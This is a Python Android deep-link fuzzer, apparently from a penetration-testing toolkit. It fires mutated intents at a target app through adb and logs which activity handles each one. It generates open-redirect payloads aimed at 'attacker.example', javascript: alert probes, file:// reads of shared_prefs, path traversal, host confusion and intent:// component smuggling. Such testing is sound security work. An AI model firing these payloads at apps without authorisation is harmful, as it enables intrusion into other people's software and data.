#!/usr/bin/env python3
"""08-deeplink-fuzz.py --inventory <eng>/inventory --pkg <pkg> [options]

Mutate every deep link in inventory/deeplinks.csv and fire each mutation as a BROWSABLE VIEW intent --
what a web page can do -- recording, per probe, the `am start -W` result, the ActivityManager START
line (cmp=), the resumed activity (dumpsys activity activities), any crash in logcat and optionally a
screenshot. Output: CSV + JSON + per-probe logcat slices. Works without a device: --list prints the
mutation set, --dry-run prints the exact adb commands.

Mutation classes (--classes):
  baseline   the declared link itself -- fired first; if the target does not handle it, its mutations are
             skipped (a mutation of a link nobody routes proves nothing)
  redirect   open-redirect parameters (url, redirect_uri, next, ...) x values: attacker host, protocol-
             relative, suffix confusion, userinfo confusion, %23@ fragment-userinfo, backslash (legacy
             minSdk<=24, D09-044), javascript:, file:, content:   (D09-042/043)
  host       the declared host mutated: suffix, userinfo, other host, port, trailing dot, wildcard sub
  traversal  path traversal into the router: ../, ..%2F, %2e%2e, ..;/, //, ./
  intent     intent:// smuggling: package=, S.browser_fallback_url, component= for every exported
             activity (and non-exported ones from --manifest), content: data for each provider authority
  case       SCHEME:// (IntentFilter scheme match is exact; Intent.parseUri normalises, am -d does not)
             and HOST case (AuthorityEntry matches case-insensitively -- a string allowlist may not)
  encoded    %2F in path/value, double encoding
  fragment   params after #, query-then-fragment, duplicate params (getQueryParameter takes the first),
             param-name case, matrix params

Quoting (why): `adb shell` hands ONE joined string to the device's /system/bin/sh -c, so every URI is
single-quoted for the REMOTE shell ('\\'' escaping) and the whole remote command is a single argument.
intent:// URIs are passed POSITIONALLY (Intent.parseUri path; honours package= and component=; most
browsers strip component= -- D09-008 matrix). Verified with a local `sh -c` simulator (fake adb); no
device was attached when this file was written.

Exit: 0 ran and >=1 CANDIDATE; 1 ran, nothing; 2 usage/environment, or nothing interpretable (no fireable
base, no probe fired, or every fired probe UNVERIFIED). --list/--dry-run exit 0. Output dir defaults to
$E/recon/deeplink-fuzz when $E (or SANE_ENGAGEMENT) is set, else ./deeplink-fuzz/<pkg>; the human output is
also appended to $E/logs/tools-08.txt. Wildcard hosts (*.example.com) are fired as sub.example.com and the
declared host is kept in the row; a `wildcard-root` host mutation fires the bare root domain.
"""
import argparse, csv, json, os, re, shlex, subprocess, sys, time, urllib.parse
from xml.etree import ElementTree as ET

REMINDER = ("REMINDER: adb runs as the shell UID. Every row above is DISCOVERY: the URI reached (or did not reach) "
            "the app; nothing is proved about what the app did with it, and nothing is proved for AM-02/AM-03. "
            "Re-prove each CANDIDATE from a real HTML page in a real browser (D09-008 for intent://) and from the "
            "zero-permission probe app (attacker-app/) before it becomes a finding (START.md R3).")
NS = "{http://schemas.android.com/apk/res/android}"
BROWSERS = re.compile(r"^(com\.android\.chrome|com\.chrome\.|org\.chromium\.|org\.mozilla\.|com\.android\.browser|"
                      r"com\.sec\.android\.app\.sbrowser|com\.brave\.browser|com\.opera\.|com\.microsoft\.emmx|"
                      r"com\.duckduckgo\.mobile|com\.kiwibrowser|com\.vivaldi\.browser|org\.bromite)")
CLASSES = ["baseline", "redirect", "host", "traversal", "intent", "case", "encoded", "fragment"]
PARAMS = ["url", "redirect_uri", "redirect", "next", "link", "u", "callback", "webview_url", "deeplink", "return_url"]


def rq(s):
    """Single-quote s for the REMOTE (device) shell. Inside '...' only the quote itself is special."""
    return "'" + s.replace("'", "'\\''") + "'"


def die(msg, rc=2):
    """Usage/environment error: message on stderr, exit 2 (sys.exit(str) would exit 1 = 'ran, nothing')."""
    print(msg, file=sys.stderr); sys.exit(rc)


class Tee:
    def __init__(self, *streams): self.streams = streams
    def write(self, d):
        for st in self.streams: st.write(d)
    def flush(self):
        for st in self.streams: st.flush()


# ---------------------------------------------------------------------------------------------- adb
class Device:
    def __init__(self, serial, dry, user):
        self.adb = ["adb"] + (["-s", serial] if serial else [])
        self.dry, self.user = dry, user
        self.api = "?"

    def show(self, *args):
        return " ".join(shlex.quote(a) for a in self.adb + list(args))

    def run(self, args, timeout=20):
        """Run an adb command (list form: no local shell is involved). Returns (rc, text)."""
        if self.dry:
            print("  " + self.show(*args)); return 0, ""
        try:
            p = subprocess.run(self.adb + list(args), capture_output=True, timeout=timeout)
            return p.returncode, (p.stdout + p.stderr).decode(errors="replace").replace("\r", "")
        except subprocess.TimeoutExpired:
            return 124, ""
        except FileNotFoundError:
            return 127, ""

    def shell(self, remote, timeout=20):
        return self.run(["shell", remote], timeout)

    def preflight(self):
        if self.dry: return
        rc, out = self.run(["get-state"], 10)
        if rc == 127: die("UNVERIFIED: adb not on PATH (set ANDROID_SDK_ROOT; see scripts/doctor.sh)")
        if out.strip() != "device": die("UNVERIFIED: no device in state 'device' (adb get-state: %s)" % (out.strip() or "none"))
        self.api = self.shell("getprop ro.build.version.sdk")[1].strip()

    def resumed(self):
        # topResumedActivity (Android 10+), mResumedActivity (older stack dumps), ResumedActivity (display dump)
        _, out = self.shell("dumpsys activity activities")
        m = re.search(r"(?:topResumedActivity|mResumedActivity|ResumedActivity)[=:] ?ActivityRecord\{\S+ u\d+ (\S+?)[ }]", out)
        return m.group(1) if m else ""


# ---------------------------------------------------------------------------------------- inventory
def read_bases(path, host_default):
    bases, skipped = [], []
    with open(path, newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))
    for i, r in enumerate(rows, 1):
        bid = r.get("instance_id") or r.get("id") or "U-%03d" % i
        if all(k in r for k in ("scheme", "host", "path")):
            sch, host, p = r["scheme"], r["host"], r["path"] or ""
        else:
            m = re.match(r"^([^:/]+)://([^/]*)(.*)$", r.get("uri", ""))
            if not m: skipped.append((bid, r.get("uri", ""), "unparseable")); continue
            sch, host, p = m.groups()
        if sch in ("*", ""): skipped.append((bid, r.get("uri", ""), "no scheme in filter: cannot be fired")); continue
        placeholder = host in ("*", "")
        declared_host, wildcard = host, host.startswith("*.")
        if wildcard: host = "sub." + host[2:]        # *.example.com matches any subdomain, not the bare root: fire one
        if placeholder:
            if sch in ("http", "https"): skipped.append((bid, r.get("uri", ""), "http(s) filter without host")); continue
            host = host_default                      # custom scheme with no host matches any host
        # pathPattern wildcards -> one concrete path; pathPrefix stays a prefix
        p = re.sub(r"\.\*", "x", p).replace("\\.", ".").replace("*", "")
        if not p.startswith("/"): p = "/" + p if p else "/"
        bases.append(dict(id=bid, scheme=sch, host=host, path=p, placeholder_host=placeholder, declared_host=declared_host, wildcard=wildcard,
                          component=r.get("component", ""), autoVerify=r.get("autoVerify", ""), uri="%s://%s%s" % (sch, host, p)))
    seen, out = set(), []
    for b in bases:
        if b["uri"] in seen: continue
        seen.add(b["uri"]); out.append(b)
    return out, skipped


def read_components(path, pkg):
    acts, auths = [], []
    if not os.path.exists(path): return acts, auths
    with open(path, newline="", encoding="utf-8") as f:
        for r in csv.DictReader(f):
            if r.get("type") in ("activity", "activity-alias") and str(r.get("exported", "")).lower() == "true":
                acts.append(r["name"])
            if r.get("type") == "provider":
                m = re.search(r"authorities=(\S+)", r.get("extra", ""))
                if m: auths += m.group(1).split(";")
    return acts, auths


def manifest_activities(path):
    """All activities incl. non-exported (apktool-decoded manifest). Used only for intent:// component= probes."""
    out = []
    try:
        app = ET.parse(path).getroot().find("application")
        for tag in ("activity", "activity-alias"):
            for el in app.iter(tag):
                out.append((el.get(NS + "name", "?"), el.get(NS + "exported")))
    except Exception as e:
        print("UNVERIFIED: manifest not parsed (%s); component= probes limited to components.csv" % e)
    return out


def fq(cls, pkg):
    return pkg + cls if cls.startswith(".") else cls


# ---------------------------------------------------------------------------------------- mutations
def mutations(b, pkg, att, params, acts, nonexp, auths, classes, max_comp):
    sch, host, path, base = b["scheme"], b["host"], b["path"], b["uri"]
    T = host if not b["placeholder_host"] else "trusted.example"
    sep = "&" if "?" in base else "?"
    out = []
    add = lambda cls, label, uri, note="": out.append((cls, label, uri, note))
    if "baseline" in classes: add("baseline", "as-declared", base)
    if "redirect" in classes:
        vals = [("https-att", "https://%s/" % att), ("proto-rel", "//%s" % att), ("suffix", "https://%s.%s/" % (T, att)),
                ("userinfo", "https://%s@%s/" % (T, att)), ("frag-userinfo", "https://%s%%23@%s/" % (att, T)),
                ("backslash", "https://%s\\@%s/" % (T, att)), ("javascript", "javascript://%s/%%0aalert(document.domain)" % T),
                ("file", "file:///data/user/0/%s/shared_prefs/" % pkg), ("content", "content://%s.fileprovider/" % pkg)]
        for p in params:
            for label, v in vals:
                add("redirect", "%s=%s" % (p, label), "%s%s%s=%s" % (base, sep, p, v))
    if "host" in classes and not b["placeholder_host"]:
        for label, h in [("suffix", "%s.%s" % (T, att)), ("userinfo", "%s@%s" % (T, att)), ("frag-userinfo", "%s%%23@%s" % (att, T)),
                         ("other-host", att), ("port", "%s:8443" % T), ("trailing-dot", "%s." % T), ("wildcard-sub", "zz.%s" % T)]:
            add("host", label, "%s://%s%s" % (sch, h, path))
        if b.get("wildcard"):
            add("host", "wildcard-root", "%s://%s%s" % (sch, b["declared_host"][2:], path),
                "bare root of a *.host filter: the platform does not match it; acceptance means a second filter or app-side host parsing")
    if "traversal" in classes:
        p0 = path.rstrip("/")
        for label, t in [("dotdot", "/../../admin"), ("enc-dotdot", "/..%2F..%2Fadmin"), ("enc-dots", "/%2e%2e/%2e%2e/admin"),
                         ("semicolon", "/..;/admin"), ("double-slash", "//admin"), ("dot-seg", "/./admin"), ("enc-slash", "%2Fadmin")]:
            add("traversal", label, "%s://%s%s%s" % (sch, host, p0, t))
    if "intent" in classes:
        hp = "%s%s" % (host, path)
        add("intent", "package", "intent://%s#Intent;scheme=%s;package=%s;end" % (hp, sch, pkg))
        add("intent", "fallback", "intent://%s#Intent;scheme=%s;package=%s;S.browser_fallback_url=https%%3A%%2F%%2F%s%%2F;end" % (hp, sch, pkg, att))
        own = {fq(b["component"], pkg)}
        for a in [x for x in acts if fq(x, pkg) not in own][:max_comp]:
            add("intent", "component:%s" % a, "intent://%s#Intent;scheme=%s;component=%s/%s;end" % (hp, sch, pkg, fq(a, pkg)),
                "exported activity reached without its own filter (am honours component=; browsers mostly strip it)")
        for a in [x for x in nonexp if fq(x, pkg) not in own][:max_comp]:
            add("intent", "component-nonexported:%s" % a, "intent://%s#Intent;scheme=%s;component=%s/%s;end" % (hp, sch, pkg, fq(a, pkg)),
                "expect Permission Denial (OS export gate); anything else is a platform/OEM bug")
        for au in auths[:3]:
            add("intent", "content-data:%s" % au, "intent://%s/#Intent;scheme=content;package=%s;end" % (au, pkg),
                "VIEW with content: data from the app's own provider -- D07/D08 chain if a handler opens it")
    if "case" in classes:
        add("case", "scheme-upper", "%s://%s%s" % (sch.upper(), host, path), "filter scheme match is exact; browsers lowercase before firing")
        if not b["placeholder_host"]:
            add("case", "host-upper", "%s://%s%s" % (sch, host.upper(), path), "AuthorityEntry ignores case; an equals()/allowlist in code may not")
    if "encoded" in classes:
        add("encoded", "value-encoded", "%s%surl=%s" % (base, sep, urllib.parse.quote("https://%s/" % att, safe="")))
        add("encoded", "value-double-encoded", "%s%surl=%s" % (base, sep, urllib.parse.quote(urllib.parse.quote("https://%s/" % att, safe=""), safe="")))
        if path != "/": add("encoded", "path-enc-slash", "%s://%s%s" % (sch, host, "/" + path.strip("/").replace("/", "%2F")))
    if "fragment" in classes:
        add("fragment", "params-in-fragment", "%s#?url=https://%s/" % (base, att))
        add("fragment", "query-then-fragment", "%s%surl=https://%s/#x" % (base, sep, att))
        add("fragment", "dup-first-trusted", "%s%surl=https://%s/&url=https://%s/" % (base, sep, T, att), "getQueryParameter returns the first; a hand parser may take the last")
        add("fragment", "dup-first-attacker", "%s%surl=https://%s/&url=https://%s/" % (base, sep, att, T))
        add("fragment", "param-name-case", "%s%sURL=https://%s/" % (base, sep, att))
        add("fragment", "matrix-param", "%s;url=https://%s/" % (base, att))
        add("fragment", "encoded-hash-userinfo", "%s%surl=https://%s/%%23@%s/" % (base, sep, T, att))
    return out


# ------------------------------------------------------------------------------------------- probes
def remote_cmd(uri, user, pin, pkg):
    u = ("--user %s " % user) if user else ""
    if uri.startswith("intent:"):
        return "am start -W %s-a android.intent.action.VIEW -c android.intent.category.BROWSABLE %s" % (u, rq(uri))
    return "am start -W %s-a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d %s%s" % (u, rq(uri), (" " + pkg) if pin else "")


def fire(dev, pkg, probe, args, outdir, handler_set):
    pid, bid, cls, label, uri, note = probe["probe_id"], probe["base_id"], probe["class"], probe["label"], probe["uri"], probe["note"]
    cmd = remote_cmd(uri, args.user, args.pin, pkg)
    rec = dict(probe, command=dev.show("shell", cmd), am_status="", am_activity="", resumed="", start_cmp="", handled_by="",
               crash="", tag="", reason="", log="", screenshot="")
    if dev.dry:
        print("# %s %s/%s %s" % (pid, cls, label, uri))
        if not args.warm: print("  " + dev.show("shell", "am force-stop %s" % rq(pkg)))
        print("  " + dev.show("logcat", "-c")); print("  " + dev.show("shell", cmd))
        print("  " + dev.show("shell", "dumpsys activity activities") + "   # poll <= %ss" % args.settle)
        print("  " + dev.show("logcat", "-d", "-v", "threadtime") + "   # START u0 ... cmp= / FATAL EXCEPTION")
        rec.update(tag="DRY-RUN"); return rec
    if not args.warm: dev.shell("am force-stop %s" % rq(pkg))
    dev.run(["logcat", "-c"])
    before = dev.resumed()
    rc, am = dev.shell(cmd, args.timeout)
    status = (re.search(r"^Status: (\S+)", am, re.M) or [None, ""])[1] if rc != 124 else "timeout"
    act = (re.search(r"^Activity: (\S+)", am, re.M) or [None, ""])[1]
    if rc == 124: status = "timeout"
    elif "unable to resolve Intent" in am: status = "unresolved"
    elif "Permission Denial" in am: status = "permission-denial"
    elif re.search(r"^Error", am, re.M): status = "error"
    elif not status: status = "no-output"
    last, r, n = None, "", 0
    while n < args.settle * 2:
        r = dev.resumed()
        if r and r == last: break
        last = r; time.sleep(0.5); n += 1
    _, log = dev.run(["logcat", "-d", "-v", "threadtime"])
    logp = os.path.join(outdir, "logs", pid + ".txt")
    with open(logp, "w", encoding="utf-8") as f:
        f.write("### %s\n### %s\n%s\n### resumed before=%s after=%s\n%s" % (uri, cmd, am, before, r, log))
    m = re.search(r"(?:ActivityTaskManager|ActivityManager) *: START u\d+ \{[^}]*cmp=([^ }]+)", log)
    cmp_ = m.group(1) if m else ""
    c = re.search(r"(FATAL EXCEPTION.*|ANR in .*|Process \S+ \(pid \d+\) has died.*)", log)
    crash = re.sub(r"^.*?(AndroidRuntime|ActivityManager): ", "", c.group(1))[:120] if c else ""
    if args.screenshot:
        sp = os.path.join(outdir, "screenshots", pid + ".png")
        try:
            with open(sp, "wb") as f:
                subprocess.run(dev.adb + ["exec-out", "screencap", "-p"], stdout=f, stderr=subprocess.DEVNULL, timeout=20)
            rec["screenshot"] = sp
        except Exception: pass
    who = cmp_ or act or r
    wpkg = who.split("/")[0] if who else ""
    if status == "unresolved": hb = "none"
    elif status == "permission-denial": hb = "os-denied"
    elif wpkg == pkg: hb = "target"
    elif re.search(r"ChooserActivity|ResolverActivity", who): hb = "chooser"
    elif BROWSERS.match(wpkg or ""): hb = "browser"
    elif wpkg: hb = "other"
    else: hb = "unknown"
    tag, why = "closed", ""
    if status in ("timeout", "no-output"):
        tag, why = "UNVERIFIED", "am start gave no result (status=%s)" % status
    elif status == "unresolved": why = "no activity matches (filter mismatch)"
    elif status == "permission-denial": why = "OS export gate: component not exported to the shell UID"
    elif hb == "target":
        cls_ = who.split("/", 1)[1] if "/" in who else ""
        if crash: tag, why = "CANDIDATE deeplink/crash", crash
        elif cls == "baseline": tag, why = "INFO baseline", "handled by %s" % who
        elif cls == "intent" and cls_ and fq(cls_, pkg) not in handler_set:
            tag, why = "CANDIDATE deeplink/intent-reaches-%s" % ("non-deeplink-component"), "%s reached via intent:// %s; browser matrix (D09-008) decides" % (who, label)
        elif cls == "host" and label in ("other-host", "suffix", "userinfo", "frag-userinfo", "wildcard-sub", "wildcard-root"):
            tag, why = "CANDIDATE deeplink/filter-accepts-foreign-host", "declared host %s, accepted %s" % (probe["base_uri"], uri)
        elif cls == "case" and label == "host-upper":
            tag, why = "CANDIDATE deeplink/host-case-accepted", "platform matches host case-insensitively; check the app's own host comparison"
        else:
            tag, why = "CANDIDATE deeplink/target-accepted:%s" % cls, "routing only: confirm the sink (WebView URL, param use) via MASTG-TECH-0173 hook or screenshot"
    elif hb == "browser": why = "handled by browser %s" % wpkg
    elif hb == "chooser": why = "chooser: another app declares the same filter (App Link verification, D09)"
    elif hb == "other": why = "handled by %s" % wpkg
    else: tag, why = "UNVERIFIED", "could not read START/resumed activity on this build"
    rec.update(am_status=status, am_activity=act, resumed=r, start_cmp=cmp_, handled_by=hb, crash=crash, tag=tag, reason=why, log=logp)
    return rec


# --------------------------------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0], formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog="\n".join(__doc__.split("\n\n")[1:]))
    ap.add_argument("--inventory", required=True, help="dir with deeplinks.csv and components.csv (scripts/inventory.py)")
    ap.add_argument("--pkg", required=True, help="target package")
    ap.add_argument("--deeplinks", help="override: deeplinks.csv path")
    ap.add_argument("--manifest", help="apktool-decoded AndroidManifest.xml: adds non-exported activities to intent:// component= probes")
    ap.add_argument("--out", help="evidence dir (default deeplink-fuzz/<pkg>)")
    ap.add_argument("--classes", default=",".join(CLASSES), help="comma list of " + ",".join(CLASSES))
    ap.add_argument("--params", default=",".join(PARAMS), help="open-redirect parameter names")
    ap.add_argument("--attacker-host", default="attacker.example")
    ap.add_argument("--host-default", default="app", help="host used for custom-scheme filters that declare none")
    ap.add_argument("--only-base", help="comma list of base ids (U-001,...) to fuzz")
    ap.add_argument("--max", type=int, default=0, help="cap on probes (0 = all)")
    ap.add_argument("--max-components", type=int, default=5)
    ap.add_argument("--user", help="am start --user N")
    ap.add_argument("--serial", default=os.environ.get("ANDROID_SERIAL", ""))
    ap.add_argument("--pin", action="store_true", help="append the package to am start (only the target may resolve)")
    ap.add_argument("--warm", action="store_true", help="no force-stop between probes (tests onNewIntent)")
    ap.add_argument("--force", action="store_true", help="fuzz a base even when its baseline is not handled by the target")
    ap.add_argument("--screenshot", action="store_true", help="screencap after each probe -> screenshots/<probe>.png")
    ap.add_argument("--timeout", type=int, default=20, help="seconds per am start")
    ap.add_argument("--settle", type=int, default=4, help="seconds to poll the resumed activity")
    ap.add_argument("--list", action="store_true", help="print the mutation set and exit")
    ap.add_argument("--dry-run", action="store_true", help="print the exact adb commands, fire nothing")
    ap.add_argument("--json", action="store_true", help="print results.json to stdout at the end")
    a = ap.parse_args()
    E = os.environ.get("E") or os.environ.get("SANE_ENGAGEMENT") or ""
    if E and os.path.isdir(E) and not (a.list or a.dry_run):
        os.makedirs(os.path.join(E, "logs"), exist_ok=True)
        sys.stdout = Tee(sys.stdout, open(os.path.join(E, "logs", "tools-08.txt"), "a", encoding="utf-8"))
    if not re.match(r"^[A-Za-z0-9._]+$", a.pkg): die("usage: package name has unexpected characters")
    classes = [c.strip() for c in a.classes.split(",") if c.strip()]
    bad = [c for c in classes if c not in CLASSES]
    if bad: die("usage: unknown class %s (choose from %s)" % (bad, ",".join(CLASSES)))
    dl = a.deeplinks or os.path.join(a.inventory, "deeplinks.csv")
    if not os.path.exists(dl): die("usage: %s not found (run scripts/inventory.py first)" % dl)
    bases, skipped = read_bases(dl, a.host_default)
    if a.only_base:
        keep = set(a.only_base.split(",")); bases = [b for b in bases if b["id"] in keep]
    acts, auths = read_components(os.path.join(a.inventory, "components.csv"), a.pkg)
    nonexp = [n for n, exp in manifest_activities(a.manifest) if exp != "true"] if a.manifest else []
    handler_set = {fq(b["component"], a.pkg) for b in bases if b["component"]}
    params = [p.strip() for p in a.params.split(",") if p.strip()]
    out = a.out or (os.path.join(E, "recon", "deeplink-fuzz") if E else os.path.join("deeplink-fuzz", a.pkg))
    probes = []
    for b in bases:
        for i, (cls, label, uri, note) in enumerate(mutations(b, a.pkg, a.attacker_host, params, acts, nonexp, auths, classes, a.max_components), 1):
            probes.append(dict(probe_id="%s-m%03d" % (b["id"], i), base_id=b["id"], base_uri=b["uri"], **{"class": cls}, label=label, uri=uri, note=note))
    if a.max: probes = probes[:a.max]
    print("deep links: %d usable, %d skipped; mutations: %d; classes: %s" % (len(bases), len(skipped), len(probes), ",".join(classes)))
    for bid, uri, why in skipped: print("  UNVERIFIED %s %s: %s" % (bid, uri, why))
    if not bases: die("UNVERIFIED: no fireable deep link in %s (nothing interpretable: exit 2, not a negative)" % dl)
    if a.list:
        for p in probes: print("%s %-10s %-28s %s" % (p["probe_id"], p["class"], p["label"], p["uri"]))
        print(REMINDER); return 0
    os.makedirs(os.path.join(out, "logs"), exist_ok=True)
    if a.screenshot: os.makedirs(os.path.join(out, "screenshots"), exist_ok=True)
    with open(os.path.join(out, "mutations.txt"), "w") as f: f.write("\n".join(p["uri"] for p in probes) + "\n")
    dev = Device(a.serial, a.dry_run, a.user); dev.preflight()
    if not a.dry_run:
        print("device api=%s  est. %.0f min at ~%ds/probe (--max, --classes, --only-base to cut)" % (dev.api, len(probes) * (a.settle + 2) / 60, a.settle + 2))
    results, dead = [], set()
    for p in probes:
        if p["base_id"] in dead and not a.force:
            results.append(dict(p, tag="skipped", reason="baseline not handled by target (--force to fuzz anyway)", command="", am_status="", am_activity="",
                                resumed="", start_cmp="", handled_by="", crash="", log="", screenshot="")); continue
        r = fire(dev, a.pkg, p, a, out, handler_set); results.append(r)
        if not a.dry_run:
            print("%-14s %-10s %-28s %-9s %s" % (r["probe_id"], r["class"], r["label"][:28], r["handled_by"], r["tag"]) + ("  " + r["reason"] if r["reason"] else ""))
            if p["class"] == "baseline" and r["handled_by"] != "target":
                dead.add(p["base_id"]); print("  UNVERIFIED %s: base link not handled by %s -> its mutations are skipped" % (p["base_id"], a.pkg))
    cols = ["probe_id", "base_id", "base_uri", "class", "label", "uri", "note", "command", "am_status", "am_activity", "resumed", "start_cmp",
            "handled_by", "crash", "tag", "reason", "log", "screenshot"]
    with open(os.path.join(out, "results.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, cols, extrasaction="ignore"); w.writeheader(); w.writerows(results)
    ncand = sum(r["tag"].startswith("CANDIDATE") for r in results)
    summary = dict(tool="08-deeplink-fuzz", package=a.pkg, device_api=dev.api, dry_run=a.dry_run, bases=len(bases), skipped=skipped,
                   probes=len(results), candidates=ncand, unverified=sum(r["tag"] == "UNVERIFIED" for r in results),
                   note=REMINDER, probes_detail=results)
    with open(os.path.join(out, "results.json"), "w") as f: json.dump(summary, f, indent=1)
    if a.json: print(json.dumps(summary, indent=1))
    print("\n[+] %d probes, %d CANDIDATE -> %s/results.csv, results.json, mutations.txt, logs/" % (len(results), ncand, out))
    print(REMINDER)
    if a.dry_run: return 0
    if ncand: return 0
    fired = [r for r in results if r["tag"] != "skipped"]
    if not fired or summary["unverified"]:
        print("UNVERIFIED: no candidate and nothing interpretable (fired=%d unverified=%d) -> exit 2, not a negative; rerun the UNVERIFIED rows" % (len(fired), summary["unverified"]))
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
